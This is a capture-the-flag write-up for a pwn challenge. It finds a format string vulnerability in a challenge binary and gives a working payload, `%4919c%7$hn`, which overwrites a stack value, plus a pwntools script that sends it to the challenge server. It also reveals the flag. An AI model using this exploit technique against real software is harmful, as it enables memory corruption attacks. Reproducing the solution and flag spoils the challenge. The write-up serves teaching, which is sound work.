# Space pirate: Entrypoint
> Write-up author: jon-brandy
## DESCRIPTION:
D12 is one of Golden Fang's missile launcher spaceships. 
Our mission as space pirates is to highjack D12, get inside the control panel room, and access the missile launcher system. 
To achieve our goal, we split the mission into three parts. In this part, all we need to do is bypass the scanning system and open the gates so that we proceed further.
## HINT:
- NONE
## STEPS:
1. First, unzip the `.zip` file given, then jump to the extracted directory.

> INSIDE

![image](https://user-images.githubusercontent.com/70703371/209463673-48df0692-e65e-4194-9ae2-be80e6856bad.png)


2. Check the file type.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209463681-989c4cff-3dce-494f-8d61-6c1af86af3b0.png)


3. Check the binary's protection.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209463703-79b1a4cc-5ea0-4fc3-843a-43fa24c83d93.png)


4. All protection's enabled.
5. Hmmm.. Let's run the file in gdb.

![image](https://user-images.githubusercontent.com/70703371/209463724-cccbe67c-76a5-4079-a654-ab8fbd6c2f50.png)


![image](https://user-images.githubusercontent.com/70703371/209463733-669e653f-1a16-486d-aea7-6c75b5fda4d0.png)


![image](https://user-images.githubusercontent.com/70703371/209463740-66d11232-6398-4630-97fb-694386ace618.png)


6. Let's decompile the binary using ghidra.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209463764-7578b83f-2012-4a18-a860-9cd436c81d04.png)


7. It looks like we can utilize format string vulnerability here.

![image](https://user-images.githubusercontent.com/70703371/209463825-73020a6a-1121-4f06-b952-89b128fd1c18.png)


8. If the `local_48` value is eq to **0xdead1337**, then the program will execute the `open_door()` function.

![image](https://user-images.githubusercontent.com/70703371/209464871-10f1ddb4-a41c-4c9e-a2fb-739ecd578909.png)


> OPEN_DOOR -> a function that will give us the flag

![image](https://user-images.githubusercontent.com/70703371/209464882-b49cc0c9-9fe2-4d8d-bc05-2990568f0c99.png)


9. However, the `local_48` value is **0xdeadbeef** not **0xdead1337**.
10. Remember that the `local_40` saves the address of `local_48`.

![image](https://user-images.githubusercontent.com/70703371/209464944-a52ddd88-f28b-4a61-9b7e-44168631a5b6.png)


11. Hence, we can utilize format string vuln to overwrite the first 2 bytes of `local_48` value.
12. Now run, the binary, choose option 1, then input 8 %p.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209465122-13eeff3b-e788-42f4-b77f-918d3e41b354.png)


13. Based from the output, we know that **0xdeadbeef** is at offset 6 and **0xdead1337** is at offset 7. 
14. Get the decimals value of **0x1337** -> `4919`
15. Means the input shall look like this -> `%4919c%7$hn`
16. To get the flag, actually u don't need to make the script, but i just want to make it 😁

> THE SCRIPT

```py
from pwn import *
import os

os.system('clear')
context.log_level = 'debug'
sh = remote('142.93.37.215', 30803)
sh.recvuntil("> ")
sh.sendline(b'1')
sh.recvuntil(": ")
A = b'%4919c%7$hn'
sh.sendline(A)
sh.interactive()
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/209465379-85f5adb9-1aa3-4ccd-9e8d-1163907fe90f.png)


17. Got the flag!

## FLAG

```
HTB{g4t3_0n3_d4rkn3e55_th3_w0rld_0f_p1r4t35}
```

